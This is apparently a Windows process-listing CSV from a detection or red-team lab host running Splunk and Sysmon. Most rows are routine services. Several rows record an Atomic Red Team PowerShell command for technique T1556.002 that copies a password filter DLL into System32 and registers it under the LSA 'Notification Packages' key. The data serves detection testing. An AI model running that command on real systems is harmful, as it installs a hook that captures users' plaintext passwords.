"ParentProcessId","ProcessId","ProcessName","Path","CommandLine","Description","CreationDate","User"
"0","0","System Idle Process",,,"System Idle Process","2022-08-29T12:46:17.556504Z",
"0","4","System",,,"System","2022-08-29T12:46:17.556504Z",
"4","320","smss.exe",,,"smss.exe","2022-08-29T12:46:17.565659Z",
"408","416","csrss.exe",,,"csrss.exe","2022-08-29T12:46:19.430487Z",
"408","492","wininit.exe",,,"wininit.exe","2022-08-29T12:46:19.527254Z",
"484","500","csrss.exe",,,"csrss.exe","2022-08-29T12:46:19.531203Z",
"484","576","winlogon.exe","C:\Windows\system32\winlogon.exe","winlogon.exe","winlogon.exe","2022-08-29T12:46:19.568696Z",
"492","628","services.exe",,,"services.exe","2022-08-29T12:46:19.682439Z",
"492","636","lsass.exe","C:\Windows\system32\lsass.exe","C:\Windows\system32\lsass.exe","lsass.exe","2022-08-29T12:46:19.726987Z",
"628","732","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k DcomLaunch","svchost.exe","2022-08-29T12:46:20.025222Z",
"628","792","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k RPCSS","svchost.exe","2022-08-29T12:46:20.143839Z",
"576","904","LogonUI.exe","C:\Windows\system32\LogonUI.exe","""LogonUI.exe"" /flags:0x2 /state0:0xa3b9a055 /state1:0x41c64e6d","LogonUI.exe","2022-08-29T12:46:20.290994Z",
"576","912","dwm.exe","C:\Windows\system32\dwm.exe","""dwm.exe""","dwm.exe","2022-08-29T12:46:20.292941Z",
"628","944","svchost.exe","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe -k termsvcs","svchost.exe","2022-08-29T12:46:20.302213Z",
"628","972","svchost.exe","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted","svchost.exe","2022-08-29T12:46:20.315806Z",
"628","288","svchost.exe","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted","svchost.exe","2022-08-29T12:46:20.328833Z",
"628","844","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork","svchost.exe","2022-08-29T12:46:20.424807Z",
"628","1032","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k netsvcs","svchost.exe","2022-08-29T12:46:20.436409Z",
"628","1040","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k LocalService","svchost.exe","2022-08-29T12:46:20.436592Z",
"628","1188","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k NetworkService","svchost.exe","2022-08-29T12:46:20.506720Z",
"628","1196","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted","svchost.exe","2022-08-29T12:46:20.507109Z",
"628","1788","spoolsv.exe","C:\Windows\System32\spoolsv.exe","C:\Windows\System32\spoolsv.exe","spoolsv.exe","2022-08-29T12:46:20.822427Z",
"628","1948","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k apphost","svchost.exe","2022-08-29T12:46:20.860153Z",
"628","1960","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k iissvcs","svchost.exe","2022-08-29T12:46:20.861890Z",
"628","2000","amazon-ssm-agent.exe","C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe","""C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe""","amazon-ssm-agent.exe","2022-08-29T12:46:20.871401Z",
"628","1260","svchost.exe","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe -k smbsvcs","svchost.exe","2022-08-29T12:46:20.913982Z",
"628","1240","inetinfo.exe","C:\Windows\system32\inetsrv\inetinfo.exe","C:\Windows\system32\inetsrv\inetinfo.exe","inetinfo.exe","2022-08-29T12:46:20.915428Z",
"628","1532","mqsvc.exe","C:\Windows\system32\mqsvc.exe","C:\Windows\system32\mqsvc.exe","mqsvc.exe","2022-08-29T12:46:20.925626Z",
"628","1800","WMSvc.exe","C:\Windows\system32\inetsrv\wmsvc.exe","C:\Windows\system32\inetsrv\wmsvc.exe","WMSvc.exe","2022-08-29T12:46:20.943330Z",
"628","2056","SMSvcHost.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe","SMSvcHost.exe","2022-08-29T12:46:20.947203Z",
"628","2084","sqlwriter.exe","C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe","""C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe""","sqlwriter.exe","2022-08-29T12:46:21.000996Z",
"628","2116","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k appmodel","svchost.exe","2022-08-29T12:46:21.053905Z",
"628","2216","splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","2022-08-29T12:46:21.085551Z",
"628","2244","TeamViewer_Service.exe","C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe","""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""","TeamViewer_Service.exe","2022-08-29T12:46:21.095619Z",
"628","2756","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted","svchost.exe","2022-08-29T12:46:21.556270Z",
"628","2336","SMSvcHost.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe"" -NetMsmqActivator","SMSvcHost.exe","2022-08-29T12:46:21.723246Z",
"2216","3448","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-29T12:46:22.439281Z",
"2000","3880","ssm-agent-worker.exe","C:\Program Files\Amazon\SSM\ssm-agent-worker.exe","""C:\Program Files\Amazon\SSM\ssm-agent-worker.exe""","ssm-agent-worker.exe","2022-08-29T12:46:23.178281Z",
"3880","3948","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-29T12:46:23.368831Z",
"732","3412","WmiPrvSE.exe","C:\Windows\system32\wbem\wmiprvse.exe","C:\Windows\system32\wbem\wmiprvse.exe","WmiPrvSE.exe","2022-08-29T12:46:24.031651Z",
"2216","3792","streamfwd.exe","C:\Program Files\SplunkUniversalForwarder\etc\apps\Splunk_TA_stream\windows_x86_64\bin\streamfwd.exe","""C:\Program Files\SplunkUniversalForwarder\etc\apps\Splunk_TA_stream\windows_x86_64\bin\streamfwd.exe""","streamfwd.exe","2022-08-29T12:46:31.679855Z",
"2216","1752","splunk-winevtlog.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe","""C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe""","splunk-winevtlog.exe","2022-08-29T12:46:39.028304Z",
"628","4708","msdtc.exe","C:\Windows\System32\msdtc.exe","C:\Windows\System32\msdtc.exe","msdtc.exe","2022-08-29T12:48:23.857678Z",
"628","4772","ScreenConnect.Service.exe","C:\Program Files (x86)\ScreenConnect\Bin\ScreenConnect.Service.exe","""C:\Program Files (x86)\ScreenConnect\Bin\ScreenConnect.Service.exe""","ScreenConnect.Service.exe","2022-08-29T12:48:24.076759Z",
"4164","4212","csrss.exe",,,"csrss.exe","2022-08-29T12:57:38.119219Z",
"4164","4332","winlogon.exe","C:\Windows\system32\winlogon.exe","winlogon.exe","winlogon.exe","2022-08-29T12:57:38.157262Z",
"4332","4628","dwm.exe","C:\Windows\system32\dwm.exe","""dwm.exe""","dwm.exe","2022-08-29T12:57:38.663745Z",
"944","508","rdpclip.exe","C:\Windows\System32\rdpclip.exe","rdpclip","rdpclip.exe","2022-08-29T12:57:40.083958Z",
"732","3404","RuntimeBroker.exe","C:\Windows\System32\RuntimeBroker.exe","C:\Windows\System32\RuntimeBroker.exe -Embedding","RuntimeBroker.exe","2022-08-29T12:57:40.132829Z",
"1032","3264","sihost.exe","C:\Windows\system32\sihost.exe","sihost.exe","sihost.exe","2022-08-29T12:57:40.256960Z",
"628","812","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k UnistackSvcGroup","svchost.exe","2022-08-29T12:57:40.263765Z",
"1032","1016","taskhostw.exe","C:\Windows\system32\taskhostw.exe","taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}","taskhostw.exe","2022-08-29T12:57:40.291846Z",
"4156","5396","g2ax_start.exe","C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_start.exe","""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_start.exe"" ""/Trigger RunAtLogon""","g2ax_start.exe","2022-08-29T12:57:53.070895Z",
"5396","5444","g2ax_comm_expert.exe","C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_comm_expert.exe","""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_comm_expert.exe"" ""Digest=71c703ea85154a4e246a04c6b40dedc1&LoaderPath=C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_start.exe&LogName=c:\users\admini~1\appdata\local\temp\2\logmeinlogs\gotoassist remote support expert\1702\20220829_125753\GoToAssist Remote Support Expert.log&ResourceDll=g2ax_expert_resource_win32_x86_en_US.dll&Trigger=RunAtLogon&UniqueId=1514""","g2ax_comm_expert.exe","2022-08-29T12:57:53.889799Z",
"732","5520","WmiPrvSE.exe","C:\Windows\system32\wbem\wmiprvse.exe","C:\Windows\system32\wbem\wmiprvse.exe","WmiPrvSE.exe","2022-08-29T12:57:54.111201Z",
"5444","5616","g2ax_user_expert.exe","C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_user_expert.exe","""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_user_expert.exe"" ""StartID={5961D988-A478-40A7-AC6C-C0AD3C944E33}&ResourceDll=g2ax_expert_resource_win32_x86_en_US.dll&Debug=Off&Stat=On&StatDb=On&Index=0""","g2ax_user_expert.exe","2022-08-29T12:57:54.193107Z",
"3136","4104","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
$passwordFilterName = (Copy-Item \""""C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll\"""" -Destination \""""C:\Windows\System32\"""" -PassThru).basename
$lsaKey = Get-Item \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\""""
$notificationPackagesValues = $lsaKey.GetValue(\""""Notification Packages\"""")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"""" \""""Notification Packages\"""" $notificationPackagesValues}","powershell.exe","2022-08-29T16:26:32.449346Z",
"4104","3804","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-29T16:26:32.467096Z",
"4104","3916","reg.exe","C:\Windows\system32\reg.exe","""C:\Windows\system32\reg.exe"" export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg","reg.exe","2022-08-29T16:26:33.760781Z",
"1032","3160","taskhostw.exe","C:\Windows\system32\taskhostw.exe","taskhostw.exe","taskhostw.exe","2022-08-29T16:33:26.430696Z",
"4156","3596","notepad++.exe","C:\Program Files\Notepad++\notepad++.exe","""C:\Program Files\Notepad++\notepad++.exe"" ","notepad++.exe","2022-08-29T16:34:12.259720Z",
"3136","8656","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
$passwordFilterName = (Copy-Item \""""C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll\"""" -Destination \""""C:\Windows\System32\"""" -PassThru).basename
$lsaKey = Get-Item \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\""""
$notificationPackagesValues = $lsaKey.GetValue(\""""Notification Packages\"""")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"""" \""""Notification Packages\"""" $notificationPackagesValues}","powershell.exe","2022-08-29T16:52:56.380954Z",
"8656","7508","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-29T16:52:56.389629Z",
"8656","8148","reg.exe","C:\Windows\system32\reg.exe","""C:\Windows\system32\reg.exe"" export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg","reg.exe","2022-08-29T16:52:56.598250Z",
"628","6484","svchost.exe","C:\Windows\system32\svchost.exe","C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation","svchost.exe","2022-08-31T00:44:41.810930Z",
"4332","6956","explorer.exe","C:\Windows\explorer.exe","explorer.exe","explorer.exe","2022-08-31T15:32:34.292442Z",
"732","7276","ShellExperienceHost.exe","C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe","""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca","ShellExperienceHost.exe","2022-08-31T15:32:35.127568Z",
"732","8920","SearchUI.exe","C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe","""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca","SearchUI.exe","2022-08-31T15:32:35.638464Z",
"628","4704","sysmon64.exe","C:\Windows\sysmon64.exe","C:\Windows\sysmon64.exe","sysmon64.exe","2022-08-31T15:32:59.293251Z",
"732","1636","unsecapp.exe","C:\Windows\system32\wbem\unsecapp.exe","C:\Windows\system32\wbem\unsecapp.exe -Embedding","unsecapp.exe","2022-08-31T15:32:59.323940Z",
"7424","7484","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
$passwordFilterName = (Copy-Item \""""C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll\"""" -Destination \""""C:\Windows\System32\"""" -PassThru).basename
$lsaKey = Get-Item \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\""""
$notificationPackagesValues = $lsaKey.GetValue(\""""Notification Packages\"""")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty \""""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"""" \""""Notification Packages\"""" $notificationPackagesValues}","powershell.exe","2022-08-31T15:58:25.719577Z",
"7484","6052","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-31T15:58:25.727866Z",
"7484","7104","reg.exe","C:\Windows\system32\reg.exe","""C:\Windows\system32\reg.exe"" export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg","reg.exe","2022-08-31T15:58:27.035979Z",
"6956","1984","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","powershell.exe","2022-08-31T17:26:54.726160Z",
"1984","6496","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-31T17:26:54.731002Z",
"6956","3212","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","powershell.exe","2022-08-31T19:12:43.552408Z",
"3212","892","conhost.exe","C:\Windows\system32\conhost.exe","\??\C:\Windows\system32\conhost.exe 0x4","conhost.exe","2022-08-31T19:12:43.558082Z",
"732","224","WmiPrvSE.exe","C:\Windows\system32\wbem\wmiprvse.exe","C:\Windows\system32\wbem\wmiprvse.exe","WmiPrvSE.exe","2022-08-31T20:38:59.241439Z",
"628","6260","TrustedInstaller.exe","C:\Windows\servicing\TrustedInstaller.exe","C:\Windows\servicing\TrustedInstaller.exe","TrustedInstaller.exe","2022-08-31T20:38:59.289441Z",
"732","5676","TiWorker.exe","C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.5121_none_7f1e2eb821dcc63a\TiWorker.exe","C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.5121_none_7f1e2eb821dcc63a\TiWorker.exe -Embedding","TiWorker.exe","2022-08-31T20:38:59.306763Z",
